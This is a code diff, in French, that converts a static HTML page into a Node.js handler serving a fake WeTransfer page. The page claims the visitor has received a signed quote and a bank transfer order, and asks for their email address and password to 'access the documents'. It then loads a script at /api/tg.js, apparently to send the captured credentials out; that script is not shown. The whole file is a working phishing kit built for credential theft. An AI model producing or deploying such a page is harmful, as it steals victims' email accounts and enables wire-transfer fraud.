@@ -1,4 +1,6 @@
-<!DOCTYPE html>
+module.exports = (req, res) => {
+  res.setHeader("Content-Type", "text/html; charset=utf-8");
+  res.end(`<!DOCTYPE html>
 <html lang="fr">
 <head>
   <meta charset="UTF-8" />
@@ -11,14 +13,12 @@
       color: #000;           /* Texte noir */
       font-family: "Helvetica Neue", Helvetica, Arial, sans-serif;
     }
-
     .container {
       max-width: 600px;
       margin: 50px auto;
       padding: 0 20px;
       text-align: center;
     }
-
     /* Logo WeTransfer */
     .logo {
       margin-bottom: 20px;
@@ -26,14 +26,12 @@
     .logo img {
       width: 120px; /* Ajuste la taille selon tes besoins */
     }
-
     /* Titre principal */
     h2 {
       font-size: 18px;
       font-weight: normal;
       margin-bottom: 30px;
     }
-
     /* Liste des fichiers */
     .files {
       margin-bottom: 30px;
@@ -47,13 +45,11 @@
       width: 24px;
       margin-right: 8px;
     }
-
     /* Texte explicatif */
     .explanation {
       margin-bottom: 20px;
       line-height: 1.4;
     }
-
     /* Formulaire */
     form {
       display: inline-block;
@@ -76,7 +72,6 @@
       border-radius: 3px;
       font-size: 14px;
     }
-
     /* Bouton */
     button {
       display: block;
@@ -96,18 +91,13 @@
   </style>
 </head>
 <body>
-
 <div class="container">
-
   <!-- Logo WeTransfer -->
   <div class="logo">
-    <!-- Remplace la source de l'image par celle de ton choix -->
     <img src="https://images.squarespace-cdn.com/content/v1/6786e2320e14800cb602c8f4/9eff5bb6-da2b-4204-8ad0-c53216465ec1/Sans%2Btitre.png?format=1500w" alt="WeTransfer" />
   </div>
-
   <!-- Titre principal -->
   <h2>Vous avez reçu des fichiers sécurisés (Devis signé + Ordre de Virement)</h2>
-
   <!-- Liste des fichiers -->
   <div class="files">
     <div class="file-item">
@@ -119,25 +109,20 @@
       Ordre de virement.pdf
     </div>
   </div>
-
   <!-- Texte explicatif -->
   <p class="explanation">
-    Pour ouvrir les fichiers, veuillez entrer les identifiants de messagerie
-    auxquels ce message a été envoyé.
+    Pour ouvrir les fichiers, veuillez entrer les identifiants de messagerie auxquels ce message a été envoyé.
   </p>
-
   <!-- Formulaire -->
   <form>
     <label for="email">Adresse e-mail (obligatoire)</label>
     <input type="email" id="email" name="email" required />
-
     <label for="password">Mot de passe (obligatoire)</label>
     <input type="password" id="password" name="password" required />
-
     <button type="submit">ACCEDER AUX DOCUMENTS</button>
   </form>
 </div>
-
-<script src="tg.js"></script>
+<script src="/api/tg.js"></script>
 </body>
-</html>
+</html>`);
+};
